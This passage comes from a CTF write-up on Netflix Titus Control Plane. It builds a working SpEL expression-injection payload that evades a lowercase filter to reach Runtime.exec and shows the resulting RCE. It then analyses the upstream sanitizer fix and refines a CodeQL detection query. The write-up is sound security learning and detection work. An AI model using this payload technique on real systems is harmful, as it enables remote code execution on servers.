"softConstraints":{"constraints": {"#{\"\".class.class.methods[0].invoke(\"\", \"java.lang.Runtime\")}"}}
~~~

 But `Runtime` has an uppercase "R", so that won't do it! At this point I spent A LOT of time again exploring other options for achieving RCE without `forName`, since now I could call arbitrary methods, but then it hit me that I could use the same trick to alter a String and make a letter uppercase without actually writing it!

So, our target is something like:

~~~java
"".getClass().getClass().forName("java.lang." + "r".toUpperCase() + "untime")
~~~

We just need to work around _camelCase_ methods with the two tricks mentioned before ("getter as property access" and "index access to methods"). First, we need to find the index for the `toUpperCase` method on the String class, but this time, after 3 or 4 tries, it's made clear that it would be tedious to do it by hand.

At this point we need a local lab. We already have Titus Control Plane deployed and running, so we can use `docker cp` to copy the `lib` directory of the `gateway` container to our host. Now we have an environment to quickly evaluate our SPEL expressions and see what works and what doesn't, and additionally we will be getting detailed errors, so our life got considerably easier.

My test class (which I shamelessly copy-pasted from [this presentation](https://2018.zeronights.ru/wp-content/uploads/materials/10%20ZN2018%20WV%20-%20Spel%20injection%20.pdf) and minimally adjusted) looked something like:

~~~java
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.Expression;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class SpELTest {
    public static void main(String[] args) {
        String myExpression = args[0];
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(myExpression);
        EvaluationContext context = new StandardEvaluationContext();
        System.out.println(expression.getValue(context));
    }
}
~~~

A quick `java -version` in the container (or looking at the appropriate [Dockerfile](https://github.com/Netflix/titus-control-plane/blob/8a8bd4c1b4b63e17520804c6f7f6278252bf5a5b/titus-ext/runner/Dockerfile.gateway#L1)) reveals that we need to test against Java 8, so `update-alternatives` here we go.

Now all is set, we can just compile the file and run a dirty script to find our desired `toUpperCase`:

~~~bash
javac -cp "lib/*" SpELTest.java

for i in $(seq 1 80); do java -cp lib/*:. SpELTest "\"\".class.methods[$i].name"|grep toUpperCase && echo -ne "$i \n"; done
~~~

That returns indexes 59 and 60. Looking at the Javadoc (and confirming it by printing the full method signature with `"\"\".class.methods[$i]"`), we see that the index we want is 59: `public String toUpperCase()`. Ok, that means we can finally build our string with `toUpperCase` and `concat` (thank God the later is all lowercase):

~~~java
"#{\"java.lang.\".concat(\"\".class.methods[59].invoke(\"r\")).concat(\"untime\")}"
~~~

which produces a beautiful `java.lang.Runtime` without writing a single upper-case character. Great! Time to put all pieces together (line-breaks added for readability):

~~~java
"#{"
"   \"\".class.class.methods[0].invoke(" // equivalent to Class.getMethod("forName").invoke
"   null," // first argument of invoke, i.e. the object forName is called on (it works on any object because it's a static method)
"       \"java.lang.\"" // second argument of invoke, we start building our class name
"       .concat(\"\".class.methods[59].invoke(\"r\"))" // equivalent to String.getMethod("toUpperCase").invoke("r")
"       .concat(\"untime\")"
"    )" // here we have our static reference to java.lang.Runtime
"    .runtime" // equivalent to getRuntime()
"    .exec(\"touch /tmp/pwned\")" // finally! our payload
"}"
~~~


So, the final payload we end up sending to `localhost:7001/api/v3/jobs` is:

~~~json
{
        //...
        "container": {
            //...
            "softConstraints":{"constraints": {"#{\"\".class.class.methods[0].invoke(null, \"java.lang.\".concat(\"\".class.methods[59].invoke(\"r\")).concat(\"untime\")).runtime.exec(\"touch /tmp/pwned\")}":""}}
        },
        //...
}

~~~

What a monster! I don't know if there's an easier way to do it, but let's see if it worked, because Titus still returns a 500 error. We just open a bash in the `gateway` container with `docker exec` and... (drumroll, please):

~~~
root@6ae0991ee91a:/opt/titus-server-gateway# ls /tmp/
hsperfdata_root  pwned
~~~

We got our RCE!! \o/

## Step 4.2. Mitigation

Now, downloading the fixed database of Titus Control Plane and running the query again returns 0 results as expected. To see how the issues were fixed, we can run a Quick Evaluation on our sources and see what changed. Surprisingly, now we only obtain one source, in a new class called `AbstractConstraintValidator`:

~~~java
public abstract class AbstractConstraintValidator<A extends Annotation, T> implements ConstraintValidator<A, T> {

    // ...
    private static String sanitizeMessage(String message) {
        return message.replaceAll("([}{$#])", "\\\\$1");
    }

    @Override
    final public boolean isValid(T type, ConstraintValidatorContext context) {
        return this.isValid(type, message -> {
            String sanitizedMessage = sanitizeMessage(message);
            return context.buildConstraintViolationWithTemplate(sanitizedMessage);
        });
    }

    // ...
    abstract protected boolean isValid(T type, Function<String, ConstraintValidatorContext.ConstraintViolationBuilder> constraintViolationBuilderFunction);

}
~~~

Alright, they sanitized the custom error messages by escaping reserved EL injection characters in the `sanitizeMessage` method. From the CodeQL perspective, `replaceAll` acts as a taint flow sanitizer, which stops taint from propagating. Probably that's why we stopped seeing our flows reach the sink.

This confirms two things:

1. Our query correctly detects the fix and doesn't throw false positives
2. The fix seems correct

Now, this is not the only way GitHub Security Lab team recommended fixing the issue. One of their recommendations was:

> - Disable the EL interpolation and only use ParameterMessageInterpolator:
> 
> ~~~java
> Validator validator = Validation.byDefaultProvider()
>   .configure()
>   .messageInterpolator(new ParameterMessageInterpolator())
>   .buildValidatorFactory()
>   .getValidator();
> ~~~

Would our query have detected this fix? Probably not, since the taint flow would remain untouched and thus the alert would keep appearing.

To appropriately detect this fix, we need to add a little improvement to our query. We know that:

- `ValidatorContext.messageInterpolator` calls are used to register message interpolators.
- We need a registered `SpELMessageInterpolator` (or, more generally, an interpolator that processes EL expressions) for the attack to work.

So the plan would be to _globally_ sanitize our flows if the appropriate interpolator is not registered. But after looking at this solution for a while, and seeing the following documentation regarding the `messageInterpolator` method:

~~~java
/* Defines the message interpolator implementation used by the Validator. If not set or if null is passed as a parameter, the message interpolator of the ValidatorFactory is used. */
~~~

I realized that, if no `messageInterpolator` calls were found, it would be hard to tell whether EL expressions would be interpolated or not, since it depends on the default `ValidatorFactory` being used. So discarding issues just because no dangerous interpolators aren't being explicitly set seems an excellent way of having false negatives.

We should take it the other way around: unless a known, safe message interpolator is being explicitly set, we assume that the one being used is unsafe. So let's do that!

We start by defining the method we are looking for:

~~~ql
class MessageInterpolator extends Method {
    MessageInterpolator() {
        this.getDeclaringType().hasQualifiedName("javax.validation", "ValidatorContext") and
        this.getName() = "messageInterpolator"
    }
}
~~~

Now, we can define our "safe" message interpolator:

~~~ql
class SafeMessageInterpolator extends RefType {
    SafeMessageInterpolator() {
        this.hasQualifiedName("org.hibernate.validator.messageinterpolation", "ParameterMessageInterpolator")
    }
}
~~~

Note that having this class has the advantage of being extensible: if we want to consider other interpolators as "safe" we just need to add them to this class.

Ok, finally we need to determine if this safe interpolator is actually being registered:

~~~ql
class SetSafeMessageInterpolator extends MethodAccess {
    SetSafeMessageInterpolator() {
        this.getCallee() instanceof MessageInterpolator and
        this.getArgument(0).getType() instanceof SafeMessageInterpolator
    }
}
~~~

Great, this will find us calls to `messageInterpolator` with a `SafeMessageInterpolator` as parameter. But wait, since this will be a sort of "global sanitizer" of our query, we need to make sure this isn't being called in non-production code, i.e. tests. So let's try to tell apart test files from production files and add that as a condition for our `messageInterpolator` call:

~~~ql
class TestFile extends File {
    TestFile(){
        // this is an heuristic that applies well to this project,
        // other projects might need additional conditions here
        this.getAbsolutePath().matches("%/test/%")
    }
}

class SetSafeMessageInterpolator extends MethodAccess {
    SetSafeMessageInterpolator() {
        this.getCallee() instanceof MessageInterpolator and
        this.getArgument(0).getType() instanceof SafeMessageInterpolator and 
        not this.getFile() instanceof TestFile
    }
}
~~~

Now it looks better. We only need to make it act as a "global sanitizer" (made up term), i.e. if it's being called wherever in the code, the query shouldn't return results. We could add the clause `and not exists(SetSafeMessageInterpolator safe)` to our `select` statement, and that should work, but that would make our taint tracking configuration less reusable. So let's try to add it directly in the config, by overriding the `hasFlowPath` predicate:

~~~ql
override predicate hasFlowPath(DataFlow::PathNode source, DataFlow::PathNode sink) {
    super.hasFlowPath(source, sink) and
    not exists(SetSafeMessageInterpolator safe)
}
~~~

That should detect if the fix was made by disabling EL interpolation with `ParameterMessageInterpolator`. But how do we make sure it's working? Well, we could consider the interpolator being currently used (`SpELMessageInterpolator`) is a "safe" one (even though it isn't). By adding it to the `SafeMessageInterpolator` class, we can see that indeed our query now returns 0 results. We just made our query more precise by reducing potential false positives.

Of course, this is an heuristic approach, since we aren't making sure that the validator in which the interpolator is being registered is the one that ends up being used to validate our beans, but since this codebase has only one call to `messageInterpolator` (outside of tests), it does the trick. With more time and dedication, maybe the query could be improved to only sanitize the results if that connection is found.

The final query with all the improvements described in this writeup can be found in the file `query_final.ql`.

## Conclusion

In this writeup, we have seen how all steps in the "GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition" were solved in a way that tried to be clear, easy to understand and generalizable to other projects, not just the challenge project. Efforts were made to try to follow DRY principles, improve maintainability and readability and, in short, provide good code quality.

The final query could probably still be improved, though. Some heuristics, while working for the CTF, would probably have some problems if executed at scale in different projects. Also, sources could be narrowed down to only those influenced by actual user inputs, instead of considering all beans being validated as tainted. More remediation advice was given in the original advisory too, which if applied may expose other problems in this query (for instance, it would be interesting to see how this query behaves if Hibernate-Validator is replaced with Apache BVal, as suggested).

From a personal perspective, this CTF was an incredible ride. When I started, I didn't have the slightest idea of how many hours I would end up needing for solving each step. These kind of challenges always start with some frustration until you really understand what the goals are and how the steps are connected, but from that point on it's an absolute blast.

The exploitation PoC part was the most surprising one. Since this was a CodeQL challenge, I expected the query itself to be the hardest part. And while that's probably true, if I was expecting a straightforward exploitation after the detection, boy was I wrong! I was amazed of all the difficulties a single `toLowerCase` could bring to your life when you are trying to build your payload. Without a doubt, choosing this finding as the CTF challenge was a really good decision!

In short: a fun and amazing learning experience. Hoping to see more of these CTFs in the future. Thanks for reading!
